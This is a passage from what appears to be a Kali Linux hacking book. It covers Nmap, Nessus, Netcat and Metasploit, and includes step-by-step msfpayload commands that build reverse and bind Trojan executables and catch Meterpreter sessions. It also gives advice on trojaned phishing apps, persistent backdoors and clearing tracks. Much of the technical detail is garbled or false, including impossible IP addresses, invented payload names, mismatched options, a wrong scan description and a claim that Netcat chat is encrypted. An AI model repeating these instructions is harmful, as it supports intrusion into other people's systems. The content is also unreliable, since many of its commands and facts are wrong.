    LeafpadIts function is same as Windows Notepad (Notepad). It is a simple text
    editor. For those who use the Windows system, it is not used to operating. With
    Leaf pad, you can reduce learning disabilities. Leaf pad is available in "Apps\Favorite\Leafpad".First
    of all, before going through the commands, understand these three basic regular
    expressions.1) [ ] (bracket): Optional option, optional or not. 2) { } (bracket):
    Necessity option, must be used.3) a | b (dash): Indicates that one of several
    options is used.Overview of kali Linux toolsIn this below section, we will explain
    about the different types of software''s that are available in Kali Linux operating
    system.01 - Information Collection:Regardless of penetration testing or hacking,
    you must first figure out the details of the other party that is the host. You
    can''t rush to start, or the grass will shock you. The so-called information collection
    phase refers to collecting information related to the target system from the Internet
    beforehand, and carefully analyzing and finding out what information is available.
    This information includes at least: the type of system, the services provided,
    routing information, whether there is a firewall, intrusion detection or protection
    mechanism, contact information of the person concerned, and even information about
    the website that exists in the search engine. There are many tools like Nmap in
    kali Linux environment.02 - Vulnerability Analysis:Utilizing Various vulnerability
    assessments, network port scans, vulnerability detection, and other tools try
    to spy on possible vulnerabilities in the target system. The information collected
    through the spying system is not a loophole. It just provides the target that
    we can try further to improve the security. The more complete the information
    collected, the more the area that can be attacked. Big, the higher the chance
    of compromised the system. Nessus is one of the vulnerability Analysis applications
    present in the Kali Linux.03 - Web Program:Most of the objects of the penetration
    test are web applications. The main reason is that the Web originally provides
    services to the outside world and anyone can access the system. As long as the
    application design is not strict enough, the hacker can use the legal pipeline
    control System, then website system. Most of the custom developers are not good,
    there will always be people who code in a way such that they leave the chances
    of creating a backdoor. Kali separates the weaknesses of Web applications from
    the exploits into a group, and the weight of Web attacks in penetration testing.04
    - Database Evaluation:It belongs to the vulnerability analysis, but Kali 2.0 has
    classified it independently. Indeed, in many sites'' penetration testing projects,
    it is not difficult to find that administrators rely too much on network firewalls,
    and ignore the local firewall of the server, causing the database system to have
    almost no protection when causing horizontal attacks. Therefore, Database evaluation
    programs are one of the important skills set of tools that need to be mastered
    by hackers and kali Linux provides them.05\. Password attack:One way to deal with
    the system''s login mechanism is to try to crack it online. However, this attack
    method gradually loses its advantage. The current design concept will emphasize
    the failure to lock the account several times, some even add a graphic verification
    code to automate the tools you are trying to log in are useless. Another One is
    offline cracking, but the key point is to get the password information first,
    that is, to find the user data from the system. In practice, you usually look
    for SQL Injection vulnerabilities, in order to dump the user''s account information
    from the database, but the passwords should be encrypted, you need to Use the
    offline decryption tool to restore the encrypted password to plaintext.06 - Wireless
    Attack:If the target is enabled or connected to the wireless network or Bluetooth,
    you can try to circumvent the general firewall control through wireless attacks,
    plus the mobility of the wireless network (the range of radio waves) is wide and
    intrusive. Concealed, if the target is using a wireless network, it should be
    used to assess potential vulnerabilities.07-Reverse Engineering:The so-called
    reverse engineering is to reverse the execution of the archives, or to track the
    execution process, to exploit the existing loopholes, to change the program functions,
    or to install a controllable back door. For example, some systems are client/server
    and web hybrid applications, and even call Web services. In order to understand
    the call mechanism on the client side, use reverse translation. Or Debug mode
    to find the entry point or connection string of the call. Another use of reverse
    engineering is digital identification. When the system is implanted in the back
    door, in order to trace the connection source or anti-intrusion, the defender
    may also crack the back-door function through reverse engineering to carry out
    counter-action.8 - ExploitingWhen Vulnerabilities are found and when these vulnerabilities
    can be manipulated, the hackers will not be satisfied. Instead, they will try
    to control the target through the vulnerability. There are many ways to exploit
    the vulnerability, and look at the intruder''s skill and purpose. However, you
    must be cautious when conducting penetration testing, so as not to be self-defeating.9-Sniffing/spoofing:When
    the system has proper protection and the application cannot find exploitable vulnerabilities,
    it must use the network packet monitoring mode to intercept user information.
    To achieve the purpose of interception, you can use spoofing, the middle man attack
    or port listening mode.10-Permission maintenance:As long as it is a system in
    operation, there will be data circulation. In order to continuously obtain the
    latest information, after completing the system intrusion, a high-right account
    and backdoor program must be placed in the system. You can enter and leave the
    system at any time, and continue to interact with the system. In order to avoid
    being traced, you must properly clear the activity track so that the intrusion
    cannot be interrupted.11-Digital forensics:This is a field of digital search and
    forensics, including hard disk, memory content capture and analysis. Kali also
    includes anti-search tools to encode backdoors or Trojans to circumvent the blocking
    of antivirus software or other intrusion detection tools.12-Reporting tools:Penetration
    testing is usually done by a group of people working together to collect information
    that is shared, consolidated, or applied to each other to make penetration testing
    more efficient.  So few tools are given which can make post hacking process less
    troublesome.Chapter 3: Basic kali Linux toolsAfter a brief explanation of installation
    of the kali Linux and a detailed overview of various types of tools that are present
    in the Kali operating system in this chapter we will go through some practical
    scenarios with the help of Tools present in kali that will help us understand
    the basics of hacking in detail.How hacking should be done?There is no particular
    hacker guideline that can teach you hacking with perfection. But there is always
    a famous procedure that good hackers follow subconsciously for better results.
    Our book in the next three chapters will introduce the hacking process that you
    should further sharpened by expanding different skill sets by learning different
    programming languages, vulnerabilities and exploit development.The Hacking RoadmapHacking
    is like cooking. You need to get ready with all the ingredients (i.e. programs)
    and know in detail about the properties of that ingredients (or programs) and
    use them together to produce a culinary material. What if the food doesn''t taste
    good? That is if you are unable to get the better results after all the hacking
    process? There is only one way you can do i.e.; to try again.There are five important
    areas you need to learn in detail to master hacking.1) Information Gathering2)
    Automatic Vulnerability Scanning3) Exploiting4) Password Attacks5) Sniffing and
    wireless attacks1) Information gatheringInformation gathering is always considered
    a pivotal job hacker should do before attacking a target. It roughly sums up that
    by using information gathering tools we can acquire a lot of information about
    the target hosts, which can help us create exploits that would help us create
    a backdoor for further exploitation. We can even use tons of publicly available
    information about the target to get a good idea on what strategy we should use
    to make this attack successful.2) Automatic Vulnerability scanningVulnerability
    Scanner is a program that automatically finds and discovers security vulnerabilities
    in computers, network applications, web applications and software. It detects
    the target system through the network, generates data to the target system, and
    matches the feedback data with the built-in vulnerability signature database to
    enumerate the security vulnerabilities existing on the target system. Vulnerability
    scanning is an indispensable means to ensure system and network security. In the
    face of Internet intrusion, if users can detect security vulnerabilities through
    network scanning as soon as possible according to the specific application environment,
    and timely take appropriate measures to repair, it can effectively prevent the
    occurrence of intrusion events. Because the work is relatively boring, we can
    implement it with some convenient tools, such as Nessus and OpenVAS.3) ExploitingExploiting
    is an important way to gain control of the system. The user finds a vulnerable
    vulnerability from the target system and then uses the vulnerability to obtain
    permissions to control the target system. In order to facilitate the user''s practice,
    this chapter will introduce Metasploitable 2 released by Metasploit. Users can
    use it as a Linux operating system for practice. This chapter will use the vulnerabilities
    on the Metasploitable system to introduce various penetration attacks, such as
    MySQL database, PostgreSQL database and Tomcat service.Privilege escalation is
    to maximize the minimum privilege a user has. Often, the users we gain access
    to may have the lowest permissions. However, if you want to perform a penetration
    attack, you may need the administrator account permissions, so you need to increase
    the permissions. Permission elevation can be achieved by using fake tokens, local
    privilege escalation, and social engineering.4) Password AttacksA password attack
    is to recover the password plaintext without knowing the key. Password attacks
    are an important part of all penetration testing. If you are a penetration tester
    and don''t understand passwords and password cracking, it''s hard to imagine.
    So, no matter what you do or how far our technical capabilities are, passwords
    still seem to be the most common way to protect data and restrict access to the
    system. This chapter describes various password attack methods, such as password
    online attacks, router password attacks, and creating password dictionaries.5)
    Sniffing and wireless attacksThis is where people use wireless network tools along
    with a network adapter to capture packets and crack password or acquire sensitive
    information from the target. Sniffing tools like Wireshark are famous and can
    be used for a lot of attacks and finding out the packets.In the below section
    and subsequent chapters, we will in detail go through the process explained above
    along with few tools that are developed in order to make this process less time
    consuming and entertaining for the hackers. First of all, we will go through the
    information gathering process where we will scan open ports with the help of a
    famous reconnaissance tool called Nmap.Information GatheringInformation gathering
    is an important pre attack phase where the hackers collect a lot of information
    that is available in public about the target he is going to attack. Many hackers
    use social engineering techniques to get a solid bunch of information about target
    and the technology it is using along with the operating system and version it
    uses. Every hacker uses different set of methodologies to create a good information
    about the host before targeting.There are three important phases in information
    gathering as explained below1) Gathering information from search enginesUse search
    engines like Google to get good information about the host you are trying to attack.
    You will be surprised with the fact that how much you can find information that
    is public.2) Social engineering techniquesSocial engineering techniques are crazy
    because you can just psychologically trick an employee or the target you are chasing
    with a simple thing like phishing email to create a backdoor via your exploit.
    All great hackers rely on social engineering instead of doing things in a more
    complex way.3) Port ScanningIf you are curious to know about what a port scan
    is associated with follow the next few paragraphs carefully. There are various
    services provided by the server, such as publishing a home page and sending and
    receiving e-mails.Services that perform network communication include a window
    called "port" for communication, which is managed by numbers. For example, well-known
    services are basically pre-assigned port numbers, such as 80 for HTTP services
    that publish their home pages on the Internet and 587 for sending emails.The act
    of investigating from the outside (attacker point of view) that what kind of port
    the server is opening is called "port scan".How a port scan be done?Port scanning
    is the process of sending specific data from the outside and examining the corresponding
    responses in order to investigate the running services on servers connected to
    the network. By analyzing the response obtained, you can identify the version
    of the service running on the server, the OS, etc.There were several tools like
    Nmap and Zenmap do port scanning. Nmap is a Command interface tool where as Zenmap
    is a graphic interface tool. Both uses the same techniques and are free of cost.
    In the next section, we will explain about Nmap and its features in detail with
    a lot of command line code that will help you understand better. Try to use your
    computer while reading this book, After all, it is a known fact that you can learn
    hacking or programming by doing them but not just by reading.NmapNmap is one of
    the famous hacking tools and is widely known for its popularity among penetration
    testers. People often mistake that Nmap is only popular for its information gathering
    abilities but often doesn''t understand that Nmap can also be used as a vulnerability
    detector that can be automated. It can be used in various operating systems that
    are open source and in Windows.Nmap is a powerful tool that can be used for port
    discovery, host discovery, service discovery, detection of operating system and
    its version. Nmap can be used in both command line and with graphical user interface
    (GUI). But remember that good hackers use the Command line.How Nmap works?Nmap
    is programmed in a way such that it can perform scanning using different technologies
    like TCP and FTP protocol scans. All these scans are prone to their strengths
    and weaknesses and hackers can understand it vividly when they are trying to attack
    hosts with Nmap.In hacking terminology, we call the target technically as the
    target host. When using Nmap we need to first understand the complexity of target
    to decide which scan to use either simple easy scan or a complex scan that would
    take a lot more time. We need to polish our skills to use some very complex and
    intuitive techniques to get past from intrusion detection systems to get good
    results.Below are some strategies that will help you appreciate various operations
    Nmap can perform:1) You can scan a single host with the following command# nmap
    www.hackingtools.com# nmap 192.232.2.12) You can scan an entire subnet with the
    following command# nmap 192.232.2.1/243) Nmap can also be used to scan multiple
    targets with the following command#nmap 192.232.2.1 192.232.2.44) There is also
    an option in Nmap that will let you scan a range of targets as follows#nmap 192.232.2.1-100
    (This in precise scans every host that is in between the IP addresses 192.232.2.1
    and 192.232.2.100)5) Nmap has an option where you can store all the Ip addresses
    you have in a text file that is in .txt format and place in the same directory
    of Nmap so that it can scan every IP address present in the text file without
    manually entering each one of them.#nmap -iL  sampleip.txt6) If you want to see
    a list of all the hosts you need to scan you can enter the following command#nmap
    -sL 192.232.2.1/247) Nmap provides an option where we can exclude a single IP
    address from scanning with subnet hosts#nmap 192.232.2.1/24 -exclude 192.232.2.4And
    if you want to exclude more than one IP, you can include all of them in a text
    file so that they can be excluded while doing the subnet scan like shown below.#nmap
    192.232.2.1/24 -exclude excludeIp.txtBefore learning about the scanning procedures
    Nmap offers let us know about scanning ports on a specific host. You can scan
    individual ports in a host using the following command.#nmap -p78,56,23 192.232.2.1Scanning
    technology in NmapThere are different types of scanning strategies that Nmap follows
    to do the work. In this section, we will describe about these procedures in detail
    along with few commands that will give you a good overview.1) sS scan ( Tcp SYN
    )This is a typical scan that Nmap uses if nothing is specified by the hacker to
    the software. In this scan usually, Nmap will not give a full handshake to the
    target system. It will just send an SYN packet to the target host, which will
    then check for any open ports, but not creating any sessions that may be used
    after logging. This is one of the greatest strengths of this scanning strategy.
    To use this scan the hacking tool should be given root access otherwise it will
    show an error. Below we give the command line for this scan.hacking@kali #nmap
    -sS  262.232.2.12) sT scan ( TCP connect)If the sS scan is not used due to the
    reason that it is not feasible for the current attack situation people normally
    use sT scan as their next savior. It gives three handshakes with open ports and
    calls a method called connect () which makes the software to find TCP ports. sT
    scan when preferred can also be used to find UDP ports although people use it
    rarely.Below is the command for -sT scan:hacking @kali #nmap -sT 292.232.2.13)
    sU scan ( UDP scan)This scanning is also in the penetration-testing checklist
    after the importance of -sS scan. There is no need to send SYN packets like in
    TCP scan because this will just find UDP ports that are open. When the hackers
    start using the scan A UDP packet reaches the target host and waits for a positive
    response. If at all a response is received an open port is found. If it sends
    an error message with an Echo command then the port is closed.Below is the command
    line for -sU scanhacking @ kali #nmap -sU 292.232.2.14) sF scan ( FIN scan)This
    is a special type of scan that is used because some targets may have installed
    intrusion detection systems and firewalls that stop SYN packets that are sent
    using a TCP scan. For this sole reason, Fin scan is used if there is any extra
    detection scan happening on the other side. Fin scan does not save any log information
    to be detected so there is a great chance of the Fin packet to find out few open
    ports by sneaking into the target systems.Here is the command for -sF scanhacking@kali
    #nmap -sF 292.232.2.15) sP scan ( Ping scan)Ping is a famous network protocol
    method that checks whether a host is live or not by trying to connect to the target
    host. Ping scanning in Nmap also is used for the same purpose and is not used
    to check open ports. Ping scan asks for root access to start a scan. If you are
    not ready to provide the administrative privileges you can just use the connect
    method to start a ping sweep from Nmap.Here is the command for -sP scanhacking
    @ kali #nmap -sP 292.232.2.16) sV scan ( version detection scan)A version detection
    scan is one of the obsessive usages of Nmap for hackers. To attack a target system,
    you need to know about the technology and operating system the host is using so
    you create your exploits and backdoor strategies to break into the system. However,
    unlike TCP scans version detection scan takes a lot of time because when we start
    a sV scan in the background TCP scan gets started and searches for the open ports.
    After the hunt for open ports gets finished sV scan automatically analyzes them
    and determines the information about the target host. Due to this complex procedure,
    it may take a lot of time.Here is the command for -sV scanhacking @ kali #nmap
    -sV 292.232.2.17) sL scan ( Idle scan)This is one of the craziest features of
    Nmap because it just acts like a proxy server while doing attacks. When using
    idle scan you can send packets using another host Ip. This anonymity can help
    hackers to stay in the dark if something goes wrong or severe. Protecting himself
    from the investigation is what every hacker strives for especially in these modern
    times.Here is the command for -sL scanhacking @ kali #nmap -sL 292.432.2.6 292.432.2.1Things
    Nmap can detect:Nmap can detect the Device type of the host that is (router, workgroup,
    etc.), running operating system, operating system details i.e. version and network
    distance (approximate distance between the target and the attacker).While using
    Nmap always use ping scan only when necessary because some firewalls in the target
    hosts can detect that an attack is going to happen and will block the attacker''s
    addresses to make any connection.By using the below command you are saying to
    the software that doesn''t ping the remote host:hacking @ kali # nmap -O -PN 292.428.5.6/
    12Using the-PN parameter can bypass the Ping Command, but it does not affect the
    discovery of the host system. NMAP operating system detection is based on open
    and closed ports. If Os scan cannot detect at least one open or closed port, it
    will return the following error.The error code is below:Warning: we cannot find
    any open or closed ports to get information on the target systemIt is difficult
    to accurately detect the remote operating system with NMAP, so we need to use
    NMAP''s guess function, osscan-guess operation guesses which operating system
    type is closest to the target.#nmap -O -osscan -guess 192.232.2.1By using the
    following commands and strategies, you can research a lot of information about
    the target point and can use that information to create backdoors and exploit
    the system. The exploitation of the system using Metasploit will be explained
    in further chapters but only after a description of Nessus an automatic vulnerability
    assessment tool that finds vulnerabilities automatically otherwise which you need
    to find manually by boring procedures.Before going to talk about Nessus let us
    have a simple exercise. Please try to do this Exercise for better understanding
    of the Information Gathering.Exercise:Start kali Linux terminal and enter into
    Nmap using the commands. Find the subnet masks for [www.nmap.com](http://www.nmap.com/)
    and find the operating system and version that it uses. Complete different scans
    and create a detailed report on all the ports that are available.Automatic vulnerability
    ScanningFirst of all, let us learn in detail about what a vulnerability means
    along with examples of few vulnerabilities.What is a vulnerability?Vulnerability
    is a defect in the host system that lets hackers create backdoors to enter into
    the system by creating an exploit for the vulnerability. For example, Ransomware
    has used a vulnerability in windows to exploit hundreds of systems worldwide.Web
    applications also are prone to vulnerabilities. XSS vulnerability, CSRF detection
    and others are declared high-risk vulnerabilities by OWSAP, which determines the
    severity of vulnerabilities.What is Automatic Vulnerability Scanning?Vulnerabilities
    can be easily found out with a manual testing after the coding. However, it is
    so boring and time consuming that many avoid it. For this purpose, certain automated
    scanners are made for the purpose of scanning the system and detect any if coincided
    from the database that they have.Software''s like Nessus and Burp suite make this
    automatic scanning effective and are prone to get good results if done well. The
    next section will give a brief overview about Nessus and its usage.NessusNessus
    is said to be an automatic scanning tool that has a wide database with well-known
    vulnerabilities, which the tool will use to scan the target and give results for
    the attacker. For the Penetration Tester, Nessus is one of the essential tools.
    A summary of Nessus typically includes thousands of up-to-date vulnerabilities,
    a variety of scanning options, and an easy-to-use graphical interface and effective
    reporting. Nessus is loved because it has several characteristics.Here''s how
    it works:To provide a complete computer vulnerability scanning service and update
    its vulnerability database at any time; different from the traditional vulnerability
    scanning software Nessus can analyze and scan the vulnerability of the system
    at the same time, and its efficiency can be adjusted according to the resources
    of the system. If the host is configured with more resources (such as faster CPU
    speed or increased memory size) , its performance can be improved because of the
    abundance of resources; it can define its own plug-in; NASL (Nessus Attack Scripting
    Language) is a Language issued by Tenable, security Test Options for Writing Nessus;
    full support for SSL (Secure Socket Layer).Nessus is preinstalled in the kali
    Linux and can be open from the menu or by using search box. It has a GUI and can
    be easily understood.On Linux, the Nessus tool is installed by default in the
    / opt / Nessus directory. 1.4 Nessus is enabled and accessed using the browser.
    For example, if your Ip is 192.232.2.1, the browser enters the https protocol
    under [https://192.232.2.1:8834](https://192.232.2.1:8834) .  First, we need to
    register a login and password to use Nessus. You can do that by going to Nessus
    official website.Creating a Basic Scan in NessusStep 1:Usually when we want to
    Scan a host or website, click My Scans in the Nessus menu and then click on New
    Scan, which creates a New Scan. We can select Web Application Tests if we are
    scanning a website; if we are scanning a host, we need to select Advanced Scan.Step
    2:Then into the following page, we enter the desired name in the Name of the SCAN.
    We write a description along with target''s Ip address and click save. After that,
    you can go to Myscans page and click on start scanning which will initiate the
    process.Step 3:When the scan is complete, there will be a scan structure, with
    five levels of vulnerability, the highest Critical and the lowest info. We can
    click through to see the details of each vulnerability description information,
    through the analysis of vulnerabilities and can better strengthen our system.This
    next section will describe about one of the famous tools among hackers in kali
    Linux. It can be used for multiple purposes like Information Gathering, Communication
    and Backdoor creation. It is called Netcat and also famously known as swiss army
    knife of the kali Linux tools. It comes pre installed with kali Linux.NetcatNetcat
    is the Swiss army knife of network hacking tools, which can read and write data
    over the network through TCP and UDP. By combining and redirecting with other
    tools, you can use it in a variety of ways in your scripts. Netcat does many amazing
    things that hackers often ask for.Netcat works basically on a principle that helps
    to transfer data between two systems that is server and client. If you have been
    successful in establishing two servers there is no stopping to doing things that
    are crazy. You can set up a chat communication in command line and also can stream
    video. There are innumerable advantages to a netcat server. We will further discuss
    in detail about them in detail.Examples of Netcat:[A(192.232.2.23) B(192.232.2.43)][
    a(192.232.2.23)  b(192.232.2.43)]How Netcat can be used in Kali Linux?How to start
    netcat?When you are in the Linux Terminal enter nc like below and click enter.
    This will start the netcat tool.$nc1) Netcat for Port ScanningBeginners always
    get confused with the term port scanning due to its popularity in penetration
    testers. If we want to explain about port scanning in layman terms it is a process
    of trying to find open ports that are vulnerable via tools for a hope to find
    a vulnerability or backdoor which can be used for exploitation.Here is the command
    to do port scanning using netcat utility.$nc -z -v -n 192.232.2.3 21-252) Using
    Netcat to start a chat serverImagine yourself in a restricted location like in
    workspace where you can''t use messaging services. netcat can solve you that problem
    by creating a chat server that can be used to converse with other systems in the
    Network. You can then create a server that will act as a chat system to whomever
    you want to communicate with in the network.Server$ nc -l 2343Client$ nc 192.232.2.1
    2343All your messages will be transported to the client using netcat server and
    the best thing is that the communications will be encrypted and cannot be caught
    by any sniffing softwares like wireshark.3) File TransferA lot of hackers when
    attacking in premises of a network are required to exchanges files between two
    computers or devices. Normally people use File transfer protocol to transfer files
    between hosts. But when you are in a private network that doesn''t allow you to
    install additional software Netcat is your safe bet to transfer files. You can
    send for example an .avi file from X to Y system by making either one of them
    as a client and other as the server.Server$nc -l 6870 < example.aviClient$nc -n
    292.232.2.1 6870 > example.aviB as Server$nc -l 6870 > example.txtClient$nc 292.232.2.1
    6870 < example.avi4) Stream a Video in the serverThere are many other ways to
    do this but if using command line this can be an easy way.Server$cat tutorial.avi
    | nc  -l 2343Looking at following examples you might have understood how useful
    Netcat is. There are several tens of experiments that you can do with Netcat in
    such a way that can help you increase your hacking skills.In this chapter, we
    have dealt in detail about the hacking tools like Nmap, Nessus and Netcat along
    with explaining potential examples that can give you a good clarity over things
    that happen in the background. Next chapter deals with exploiting tool called
    Metasploit to enhance in our skills into an advanced level along with password
    attacking tools that can make you a bit clearer about the authentication systems
    that we need to deal with.Chapter 4: Advanced Kali Linux ToolsThis chapter deals
    with advanced kali Linux tools that can attack websites login forms and server
    configurations to create an authentication. We will also have a brief discussion
    about exploiting with the help of Metasploit and its payloads. This chapter occasionally
    introduces programming code. Don''t get overwhelmed with the code but try to concentrate
    on the concepts that needs to be learn to make your own attacks.ExploitingExploiting
    is a process in which hackers create exploits (like weapons) that can use known
    or unknown vulnerabilities to create a backdoor that can be used by hackers to
    exploit the system. Metasploit is a software that is available in kali Linux that
    is used to create and attack using exploits.Before talking about Metasploit in
    detail, I will explain a practical scenario where this method can be used.Practical
    Example:By using exploits in Metasploit, you can create an apk file and can send
    that exploited apk to your target using email or messenger services. When the
    target installs the app in his device, our exploit starts working in the backdoor
    and can send the files you wish to get from the target device. Hackers use much
    more complex techniques to use exploits to steal money or data.MetasploitMetasploit
    is an open source security vulnerability detection tool that comes with hundreds
    of known software vulnerabilities and is updated frequently. Metasploit was first
    announced at the black hat conference in August 2004 by four young people, HD
    Moore and Spoonm. Metasploit''s team completely rewrote and released Metasploit
    3.0 in 2007, using the Ruby programming language. This Metasploit migration from
    Perl to Ruby took 18 months more than lakh lines of code. With the release of
    version 3.0, Metasploit began to be widely adopted and received a significant
    increase in help and contributions across the security community.Some basic terminologyExploit:An
    attack by an attacker or penetration tester that exploits a security vulnerability
    in a system, application, or service.PayloadIt is the code that we expect the
    target system to execute after the attack.ShellcodeThis a set of machine instructions
    that runs as an attack payload in an infiltration attack, usually written in assembly
    language.ModuleThis is a piece of software that is available in Metasploit framework,
    can be used to launch a penetration attack or perform some secondary attack action.ListenerThis
    is a component in Metasploit that is used to wait for a network connection.How
    to use?The MSFCONSOLE, the most popular user interface for the Metasploit framework,
    provides interactive user input that can be used for anything.To start metasploit
    in the kali linux terminal enter the following code below# msfconsoleWhen you
    click the enter button you will get as follows along with the number of payloads
    available according to the date.MSF consoleCommand line (MSFCLI), MSFCLI scripting,
    and other command tool interoperability Armitage, a fully interactive graphical
    user interface in the Metasploit framework.It consists of functional programs
    as described below.MSF attack load generator (MSF payload) for generating your
    own custom shellcode, executable code, and so on.MSF encoders (MSFCODE) to help
    MSF payload encode, avoid bad characters, and evade antivirus software and IDS
    detection.Examples to describe the effectiveness of MetasploitVulnerability experimentWe
    will use this to explain the working and scope of metasploit for exploit making
    and attacking.Preparation:1\. The vulnerability exploits can be used in different
    ways according to the module we are using. This just explains the process that
    goes on.2\. Check that the penetration test system and the target system can ping
    each other.Step 1:Use search function in the msf console to search the vulnerabilitymsf
    > search vulnerability nameAfter searching, we have found that there are two modules
    on this name.Matching Modules================Name Disclosure Date Description
    Rank----  ---------------  ---- -----------Vulnerability name 1Vulnerability name
    2Step 2:Now after finding the desired vulnerabilities you can use the USE command
    to use the module for your purposemsf > use vulnerabilityname1msf auxiliary(vulnerabilityname1)Step
    3:After that, you need to fill the parameters according to the desired vulnerability.
    Hacking is a practice and skill. You need to concentrate on every parameter to
    acquire results.msf auxiliary(vulnerabilityname1) > show optionsThis will display
    the options as belowModule options (vulnerabilityname1):---- Here comes the parameters
    according to the module selected---------You can use command set to change any
    parameters. A command is shown below for your better understandingmsf auxiliary(vulnerabilityname1)
    > set parameter valueStep 4:After changing the parameters, you can just run the
    exploit to see the desired resultmsf auxiliary(vulnerabilityname1) > run   When
    you click enter the process goes on and you will find something like shown below.[*]
    192.232.2.1:2234 - Sending Vulnerabiltyname1[*] 192.232.2.1:2234 - 343 bytes sent[*]
    192.232.2.1:2234 - Checking RDP status...[+] 192.232.2.1:2234 seems down[*] Auxiliary
    module execution completedMeterpreterIn the new version after Metasploitv4, Meterpreter
    acts as an implementation channel for the post-penetration attack module and can
    be flexibly extended according to the requirements of the penetration test.Scope:
    Information collection, password retrieval, authority enhancement, intranet expansion,
    etc.Meterpreter Advantages1\. Platform versatility provides meterpreter versions
    on various major operating systems and platforms, including windows, Linux, and
    BSD, and supports both x86 and x64 platforms. There are also implementations based
    on the Java and php languages to handle different environments.2\. Pure memory
    working mode work directly load the meterpreter dynamic link library to the target
    process space, instead of uploading to disk first, then call load library to load
    the dynamic link library to start. This starts the concealment, it is difficult
    to be detected by the anti-virus software, and will not leave any traces on the
    target host disk.3\. The flexible and encrypted communication protocol adopts
    the TLV (type length value) data encapsulation format; the communication data
    is XOR-encrypted, and then the OpenSSL library is called for SSL encapsulation
    transmission to ensure the confidentiality and concealment of the transmission.4\.
    Easy to extend Meterpreter plug-ins in the form of dynamic link library files,
    you can choose your favorite programming language to write the functions you need
    according to the interface of Meterpreter, and then compile into a dynamic link
    library, copy to the appropriate directory.Meterpreter Commandsa) Basic command
    (including the meterpreter and msf terminal, ruby interface, the target shell
    interaction command)(i) BackgroundThis is used when process is hidden in the background.(ii)SessionsView
    sessions that have been successfully acquired, -i resume sessions)(iii)QuitThis
    command can be used to close the current session.(iv)ShellGet the system console
    shell, if the target system command line executable does not exist or prohibit
    access, the shell command will be wrong(v)IrbInteract with the Ruby terminal,
    call the metasploit packaged function; in the irb you can also add the metasploit
    add-on railgun to interact directly with the windows native API.2) File system
    commands (interact with the target file system, including viewing, uploading,
    downloading, searching, editing)(i)Cat (target system file interaction)(ii)Getwd
    (get the current working directory of the target machine, getlwd local current
    working working directory)(iii)Upload (upload file or folder to target -r recursive)(iv)Download
    (download files or folders from the target machine -r recursively)(v)Edit (call
    vi editor to edit the file on the target)(vi)Search (search for files on the target
    machine)3) Network commands (view the target network status, connection information,
    port forwarding, etc.)(i)Ipconfig (get the network interface information on the
    target host)(ii)Portfwd (port forwarding: forwarding the port that the target
    host is open but not allowed to access)(iii)Route (display destination host routing
    information)4) System commands (view target system information, basic operations
    on the system, etc.)(i)Ps (view the progress information of the target machine
    running)(ii)Migrate (migrate the meterpreter session process to another process
    memory space)(iii)Execute (execute the file on the target machine)(iv)Getpid (the
    pid value of the process in which the current session is located)(v)Kill (end
    the specified pid program)(vi)Getuid (get the current session username)(vii)Sysinfo
    (get system information)(viii)Shutdown (turn off the target host)Metasploit V4.0
    officially introduces a post-infiltration module whose format is consistent with
    the penetration attack module and is located in the post/ directory for special
    or custom functions.The scope includes: privilege escalation, information theft,
    password capture and utilization, intranet expansion, tracing, and maintenance.Msf
    payloadThe attack payload (msfpayload) is the code we expect the target system
    to execute after being hacked. It can be freely selected, transmitted, and implanted
    in the metasploit framework.Use the command "msfpayload -l" to view the list of
    attack payloads:# msfpayload -lOutput:Name              DescriptionPayload name       Payload
    description(Will be for different categories like HTTP, HTTPS, and IPV6)Below
    we use msfpayload to generate a rebound meterpreter Trojan running under Linux,
    the command is:msfpayload  linux/exploit/reverse_udp LOCALHOST=292.232.4.1 LPORT=8454
    X > computer/exploit..exehackingtutorial@kali:~# msfpayload linux/exploit/reverse_udp
    LOCALHOST=192.232.2.1 LPORT=8454  X > computer/exploit.exeMade by msfpayload (original
    website address).Payload: linux/exploit/reverse_udp Length: 456Options: {"LHOST"=>"192.232.2.1",
    "LPORT"=>"8454"}Parameter explanation:This is followed by the attack payload selected
    by the Trojan, followed by the parameters required for the attack payload (in
    the above example, the IP and port of the local system need to be set), and the
    "X" indicates that the executable file is generated. The >" followed by the path
    and file name of the custom generated file.2) You can check the file properties,
    see the valid windows executable:hackingtutorial@kali:~# file computer/exploit.exe
    computer/exploit.exe: PE64 executable (Graphical User Interface) Niveda 8454,
    for Linux3\. Enter msfconsole in the local penetration test system and enable
    monitoring:Use exploit/multi/handler and then specify the type of attack payload
    to listen to:Set PAYLOAD Linux/exploit/reverse_udpFinally, set the corresponding
    parameters and turn on the monitor.msf > use exploit/multi/handlermsf exploit(handler)>
    set PAYLOAD linux/exploit/reverse_udpPAYLOAD => linux/exploit/reverse_udpmsf exploit(handler) 
    > set LOCALHOST 292.232.2.1LOCALHOST => 292.232.2.1msf exploit(handler)  > set
    LOCALHOST 8454LOCALHOST => 8454msf exploit(handler)  > exploit[*] A metasploit
    function started on 292.232.2.1:8454[*] Starting the metasploit payload function4\.
    Open the Trojan file just generated by msfpayload under our windows target.5\.
    In the msfconsole of the penetration test system, I saw that the bounce horse
    has successfully returned to the meterpreter, and the experiment is successful.msf
    exploit(handler) > exploit[*] Started reverse handler on 292.232.4.1:8454[*] Starting
    the payload handler...[*] Sending stage (64464 bytes) to 292.232.2.1[*] Meterpreter
    session 1 opened (192.232.2.1:8454 -> 192.232.2.1:1036) at 2019-07-01 03:10:26
    -0400meterpreter >Bind trojan using metasploit1\. Use msfpayload to generate a
    direct-connected meterpreter trojan running under windows.Command:msfpayload linux/exploit/bind_udp
    RHOST=292.232.2.1 LPORT=8454 X > hacking/worm.exeBecause it is directly connected,
    the IP in the parameter is the target IP (RHOST), so pay attention to distinguish
    here.hackingtools@kali:~# msfpayload linux/exploit/bind_udp RHOST=292.232.2.1
    LPORT=8454 X > hacking/worm.exePayload: linux/exploit/bind_udp Length: 696Options:
    {"RHOST"=>"292.232.2.1", "LPORT"=>"8454"}2) Set the monitor (note the parameters)msf
    > use exploit/multi/handler msf exploit(handler) > set PAYLOAD linux/exploit/bind_udpPAYLOAD
    => linux/exploit/reverse_udpmsf exploit(howtohandle)> set LHOST 292.232.2.4 LHOST
    => 292.232.2.1 msf exploit(handler)> set LHOST 8454 LHOST => 8456msf exploit(handler)>
    exploit[*] This starts the handler[*] This starts binding3\. After the target
    machine runs the Trojan, the attack end is successfully connected.[*]This starts
    the payload[*] This binds handler[*] PAckets are sent (2344346 bytes) to 292.268.216.109[*]
    Exploit session 1 opened (282.122.2.1:8954 -> 292.232.2.1:8474) at 2019-06-01
    03:10:26 -0400meterpreter >Msf encoderThe Msf encoder is a very useful tool that
    can change the shape of the code in the executable file, so that the anti-virus
